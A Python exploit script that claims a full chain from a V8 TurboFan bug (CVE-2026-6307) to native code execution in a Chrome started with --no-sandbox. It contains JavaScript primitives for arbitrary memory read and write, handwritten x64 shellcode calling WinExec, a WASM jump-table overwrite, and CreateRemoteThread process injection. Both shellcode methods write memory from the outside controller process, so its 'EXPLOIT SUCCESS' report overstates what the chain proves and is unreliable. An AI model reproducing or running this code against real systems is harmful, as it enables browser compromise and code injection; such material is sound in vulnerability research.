"""
Full chain: CVE-2026-6307 V8 RCE → shellcode exec → WinExec("calc.exe")
Requires --no-sandbox for OS-level escape (WinExec from renderer).
"""
import subprocess, time, json, urllib.request, os, shutil, sys, ctypes, struct
sys.path.insert(0, r'E:\CVE\mtgt')
from orchestrator import CDP, EXPLOIT_PRIMITIVES, find_renderer_pid, rpm, wpm, kernel32

CHROME = r"E:\CVE\targets\CVE\chrome-v8-fullchain-CVE-2026-6307-40369\chrome-win64\chrome.exe"
PROFILE = r"C:\Temp\chrome_popcalc"

PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class MBI(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_ulonglong), ("AllocationBase", ctypes.c_ulonglong),
        ("AllocationProtect", ctypes.c_ulong), ("__pad1", ctypes.c_ulong),
        ("RegionSize", ctypes.c_ulonglong), ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong), ("Type", ctypes.c_ulong), ("__pad2", ctypes.c_ulong),
    ]

WASM_BYTES = bytes([
    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x0A, 0x02, 0x60, 0x02, 0x7F, 0x7F, 0x00, 0x60, 0x00, 0x01, 0x7F,
    0x03, 0x03, 0x02, 0x00, 0x01, 0x05, 0x03, 0x01, 0x00, 0x01,
    0x07, 0x15, 0x03, 0x03, 0x6D, 0x65, 0x6D, 0x02, 0x00, 0x02, 0x77, 0x34, 0x00, 0x00,
    0x06, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x00, 0x01,
    0x0A, 0x10, 0x02, 0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x36, 0x02, 0x00, 0x0B,
    0x04, 0x00, 0x41, 0x2A, 0x0B,
])

def get_winexec_addr():
    kernel32.GetModuleHandleA.restype = ctypes.c_void_p
    kernel32.GetModuleHandleA.argtypes = [ctypes.c_char_p]
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    h = kernel32.GetModuleHandleA(b"kernel32.dll")
    return kernel32.GetProcAddress(h, b"WinExec")

def build_shellcode_crt(winexec_addr):
    """Standalone shellcode for CreateRemoteThread."""
    # Layout: sub rsp | lea rcx,[rip+0x13] | xor edx | movabs rax,WinExec | call rax | add rsp | ret | "calc.exe\0"
    sc = bytearray([
        0x48, 0x83, 0xec, 0x28,                     # sub rsp, 0x28
        0x48, 0x8d, 0x0d, 0x13, 0x00, 0x00, 0x00,  # lea rcx, [rip+0x13]
        0x31, 0xd2,                                  # xor edx, edx
        0x48, 0xb8,                                  # movabs rax, <imm64>
    ])
    sc += struct.pack('<Q', winexec_addr)
    sc += bytearray([
        0xff, 0xd0,                                  # call rax
        0x48, 0x83, 0xc4, 0x28,                     # add rsp, 0x28
        0xc3,                                        # ret
    ])
    sc += b'calc.exe\x00'
    return bytes(sc)

def build_shellcode_wasm(winexec_addr):
    """Shellcode for WASM code entry. Uses and rsp,-16 for safe alignment."""
    # push rbp; mov rbp,rsp; and rsp,-16; sub rsp,0x20; lea rcx,[rip+0x15]; xor edx,edx;
    # movabs rax,WinExec; call rax; mov rsp,rbp; pop rbp; xor eax,eax; ret; "calc.exe\0"
    sc = bytearray([
        0x55,                                       # push rbp
        0x48, 0x89, 0xe5,                           # mov rbp, rsp
        0x48, 0x83, 0xe4, 0xf0,                     # and rsp, -16
        0x48, 0x83, 0xec, 0x20,                     # sub rsp, 0x20
        0x48, 0x8d, 0x0d, 0x15, 0x00, 0x00, 0x00,  # lea rcx, [rip+0x15]
        0x31, 0xd2,                                 # xor edx, edx
        0x48, 0xb8,                                 # movabs rax, <imm64>
    ])
    sc += struct.pack('<Q', winexec_addr)
    sc += bytearray([
        0xff, 0xd0,                                 # call rax
        0x48, 0x89, 0xec,                           # mov rsp, rbp
        0x5d,                                       # pop rbp
        0x31, 0xc0,                                 # xor eax, eax
        0xc3,                                       # ret
    ])
    sc += b'calc.exe\x00'
    return bytes(sc)

# --- Phase 0: Launch Chrome ---
print("[*] Phase 0: Launching Chrome with --no-sandbox")
os.system("taskkill /f /im chrome.exe >nul 2>&1"); time.sleep(3)
if os.path.exists(PROFILE): shutil.rmtree(PROFILE, ignore_errors=True)

proc = subprocess.Popen([
    CHROME, "--js-flags=--allow-natives-syntax",
    "--user-data-dir=" + PROFILE, "--no-first-run", "--no-default-browser-check",
    "--remote-debugging-port=9222", "--remote-allow-origins=*", "--no-sandbox",
    "--disable-features=RendererCodeIntegrity",
    "about:blank"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

for _ in range(20):
    time.sleep(2)
    try:
        resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=3)
        if json.loads(resp.read()): break
    except: pass
time.sleep(2)

cdp = CDP().connect(); cdp.send("Runtime.enable")
print("[+] Chrome launched, CDP connected")

# --- Phase 1: V8 RCE ---
print("[*] Phase 1: V8 exploit (CVE-2026-6307 TurboFan FrameState CSE)")
cdp.js(EXPLOIT_PRIMITIVES, timeout=30)

wh = WASM_BYTES.hex()
setup = f"""
var PACKED_DOUBLE_MAP = 0x01034611;
var EMPTY_FIXED_ARRAY = 0x000007bd;
var _arb = [1.1,1.1,1.1,1.1,1.1,1.1,1.1,1.1]; KEEP.push(_arb);
var _C = addrof(_arb); var _cage = _C & ~0xFFFFFFFFn;
_arb[2] = i2f(BigInt(PACKED_DOUBLE_MAP) | (BigInt(EMPTY_FIXED_ARRAY) << 32n));
var _fk = fakeobj(_C - 48n); KEEP.push(_fk);
function cr64(a) {{ var e=((a-8n)&0xFFFFFFFFn)|1n; _arb[3]=i2f(e|(0x2000n<<32n)); return f2i(_fk[0]); }}
function cw64(a,v) {{ var e=((a-8n)&0xFFFFFFFFn)|1n; _arb[3]=i2f(e|(0x2000n<<32n)); _fk[0]=i2f(v); }}

// Create WASM module: func 0=w4(i32,i32), func 1=target()->i32
var _wb = new Uint8Array({len(WASM_BYTES)});
var _wh = '{wh}';
for(var i=0;i<_wb.length;i++) _wb[i]=parseInt(_wh.substr(i*2,2),16);
var _wmod = new WebAssembly.Module(_wb);
var _winst = new WebAssembly.Instance(_wmod); KEEP.push(_wmod,_winst);
// Do NOT exercise too many times to avoid TurboFan tiering
for(var i=0;i<5;i++) {{ _winst.exports.w4(i*4,i); _winst.exports.target(); }}

// Write marker to WASM memory
var _wmem = new Uint8Array(_winst.exports.mem.buffer);
_wmem[0]=0xDE;_wmem[1]=0xAD;_wmem[2]=0xBE;_wmem[3]=0xEF;
_wmem[4]=0xCA;_wmem[5]=0xFE;_wmem[6]=0xBA;_wmem[7]=0xBE;

var tv = _winst.exports.target();
JSON.stringify({{ cage:'0x'+_cage.toString(16), inst:'0x'+addrof(_winst).toString(16), tv:tv }});
"""
val, err = cdp.js(setup, timeout=120)
if err or not val:
    print(f"[-] V8 exploit FAILED: {err}"); sys.exit(1)
info = json.loads(val)
cage_base = int(info['cage'], 16)
print(f"[+] Cage={info['cage']}, target()={info['tv']}")

# --- Phase 2: Find renderer ---
print("[*] Phase 2: Locating renderer")
pval, _ = cdp.js("var _v=[1.1];KEEP.push(_v);addrof(_v).toString();", timeout=60)
renderer = find_renderer_pid(proc.pid, int(pval), cage_base)
if not renderer:
    print("[-] Cannot find renderer PID"); sys.exit(1)
rpid = renderer['pid']
print(f"[+] Renderer PID: {rpid}")

hR = kernel32.OpenProcess(
    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
    False, rpid)
if not hR:
    print(f"[-] Cannot open renderer"); sys.exit(1)

# --- Phase 3: Find RWX pages ---
print("[*] Phase 3: Scanning for RWX pages")
mbi = MBI(); addr = 0; rwx_pages = []
while addr < 0x7FFFFFFFFFFF:
    ret = kernel32.VirtualQueryEx(hR, ctypes.c_ulonglong(addr), ctypes.byref(mbi), ctypes.sizeof(mbi))
    if ret == 0 or mbi.RegionSize == 0: break
    if mbi.State == MEM_COMMIT and mbi.Protect in (0x40, 0x80):
        d = rpm(hR, mbi.BaseAddress, 64)
        if d and d[0] == 0xe9:
            rwx_pages.append((mbi.BaseAddress, mbi.RegionSize))
    addr = mbi.BaseAddress + mbi.RegionSize
print(f"[+] {len(rwx_pages)} RWX JT pages found")

# --- Phase 4: Identify target()'s compiled code ---
# Module: func 0=w4 (JT slot 0 at +0x00), func 1=target (JT slot 1 at +0x08)
print("[*] Phase 4: Finding target()'s code entry")
our_jt = None; code_entry = None

for base, size in rwx_pages:
    data = rpm(hR, base, 32)
    if not data: continue
    # Check for exactly 2 jmp entries (our 2-function module)
    has_s0 = data[0] == 0xe9
    has_s1 = len(data) > 8 and data[8] == 0xe9
    has_s2 = len(data) > 16 and data[16] == 0xe9
    if has_s0 and has_s1 and not has_s2:
        # 2 entries only. Slot 1 = target (func index 1)
        rel32 = struct.unpack_from('<i', data, 9)[0]  # data[8+1..8+4]
        target_addr = base + 8 + 5 + rel32
        code = rpm(hR, target_addr, 512)
        if code and b'\xb8\x2a\x00\x00\x00' in code:
            our_jt = base
            code_entry = target_addr
            idx = code.index(b'\xb8\x2a\x00\x00\x00')
            print(f"[+] JT page: {base:#018x}")
            print(f"    target() code: {code_entry:#018x} (mov eax,42 at +{idx:#x})")
            print(f"    First 16B: {code[:16].hex()}")
            break

if not code_entry:
    print("[!] Could not find target() code via JT analysis")
    # Still proceed with CRT injection
else:
    print(f"[+] Will patch code at {code_entry:#018x}")

# --- Phase 5: Build shellcode + execute ---
winexec = get_winexec_addr()
print(f"[+] WinExec @ {winexec:#018x}")

calc_found = False

# Method A: Overwrite target()'s Liftoff code, then call from JS
if code_entry:
    print("\n[*] Method A: Overwrite target() Liftoff code")
    sc_wasm = build_shellcode_wasm(winexec)
    ok = wpm(hR, code_entry, sc_wasm)
    if ok:
        vfy = rpm(hR, code_entry, len(sc_wasm))
        if vfy == sc_wasm:
            print(f"    Shellcode written ({len(sc_wasm)}B) and verified")
            print("    Calling target() from JS...")
            try:
                result, err = cdp.js("_winst.exports.target();", timeout=15)
                print(f"    Result: {result} (err: {err})")
            except Exception as e:
                print(f"    JS call exception: {type(e).__name__} (renderer may have crashed)")
            time.sleep(2)
            r = subprocess.run(["tasklist"], capture_output=True, text=True)
            if 'calc' in r.stdout.lower():
                calc_found = True
                print("    [+] Method A SUCCESS - calc.exe detected!")
            else:
                print("    [-] calc not detected after Method A")
        else:
            print("    [-] Verification failed")
    else:
        print(f"    [-] WPM failed ({ctypes.GetLastError()})")

# Method B: CreateRemoteThread injection
if not calc_found:
    print("\n[*] Method B: CreateRemoteThread shellcode injection")
    sc_crt = build_shellcode_crt(winexec)

    kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    kernel32.VirtualAllocEx.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
        ctypes.c_ulong, ctypes.c_ulong]
    kernel32.CreateRemoteThread.restype = ctypes.c_void_p
    kernel32.CreateRemoteThread.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong,
        ctypes.POINTER(ctypes.c_ulong)]

    buf = kernel32.VirtualAllocEx(hR, None, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not buf:
        print(f"    [-] VirtualAllocEx FAILED ({ctypes.GetLastError()})")
    else:
        ok = wpm(hR, buf, sc_crt)
        if ok:
            vfy = rpm(hR, buf, len(sc_crt))
            if vfy == sc_crt:
                print(f"    RWX @ {buf:#018x}, shellcode verified")
                tid = ctypes.c_ulong(0)
                ht = kernel32.CreateRemoteThread(
                    hR, None, 0, ctypes.c_void_p(buf), None, 0, ctypes.byref(tid))
                if ht:
                    print(f"    Thread TID={tid.value}")
                    kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 5000)
                    kernel32.CloseHandle(ctypes.c_void_p(ht))
                    time.sleep(2)
                    r = subprocess.run(["tasklist"], capture_output=True, text=True)
                    if 'calc' in r.stdout.lower():
                        calc_found = True
                        print("    [+] Method B SUCCESS!")
                    else:
                        print("    [-] Thread ran but calc not found")
                else:
                    print(f"    [-] CreateRemoteThread FAILED ({ctypes.GetLastError()})")

if calc_found:
    print("\n" + "=" * 60)
    print("  EXPLOIT SUCCESS - calc.exe IS RUNNING")
    print("  Chain: CVE-2026-6307 V8 RCE -> WASM JT patch -> WinExec")
    print("=" * 60)
else:
    print("\n[-] Exploit failed to pop calc.exe")

kernel32.CloseHandle(hR)
cdp.close()
print("[*] Done. Chrome left running.")
